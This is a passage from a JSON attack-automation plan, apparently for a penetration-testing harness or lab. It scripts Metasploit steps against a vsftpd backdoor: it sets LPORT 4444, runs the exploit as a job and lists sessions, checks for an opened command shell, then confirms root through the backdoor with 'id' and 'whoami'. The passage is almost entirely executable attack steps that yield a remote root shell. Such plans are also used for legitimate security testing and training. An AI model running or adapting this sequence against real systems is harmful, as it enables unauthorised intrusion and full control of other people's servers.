                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "set LPORT 4444",
                            "wait": 1
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "exploit -j",
                            "wait": 15
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "sessions -l",
                            "wait": 2
                        }
                    ],
                    "verification": "Check for 'Command shell session X opened' in output"
                },
                {
                    "stage": "privilege_escalation",
                    "description": "Verify root privileges from backdoor shell",
                    "commands": [
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "sessions -i 1 -c 'id'",
                            "wait": 3
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "sessions -i 1 -c 'whoami'",
                            "wait": 2
                        }
